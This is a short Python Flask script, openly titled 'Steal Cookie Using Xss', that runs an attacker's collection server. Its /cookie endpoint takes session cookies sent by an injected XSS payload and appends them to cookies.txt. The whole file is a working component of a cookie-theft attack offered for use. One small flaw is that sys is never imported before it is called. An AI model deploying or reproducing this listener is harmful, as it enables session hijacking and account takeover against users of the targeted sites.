try:
	from flask import Flask,request
	from termcolor import colored
	from time import sleep
except:
	print('[!] Install The Modules .. ')
	import os
	os.system('pip install flask')
	os.system('pip install termcolor')
	os.system('pip install time')
	sys.exit()
print ('\n\t[ Steal Cookie Using Xss .. ]\n')
print(colored('\n[*] ','yellow')+'Coded By : Khaled Nassar @knassar702\n\n')
sleep(2)
app = Flask(__name__)
@app.route('/')
def index():
	return 'Hello ^_^'
@app.route('/cookie',methods=['GET','POST'])
def steal():
	if request.method == "GET" or request.method == "POST":
		data = request.values
		cookie = data.get('cookie')
		with open('cookies.txt',mode='a') as f:
			f.write('\n---------------------------\n'+cookie+'\n---------------------------\n')
		print(colored('\n\n[+] ','green')+'New Cookie ..\n\n')
		return 'Thanks :)'
if __name__ == '__main__':
	app.run()
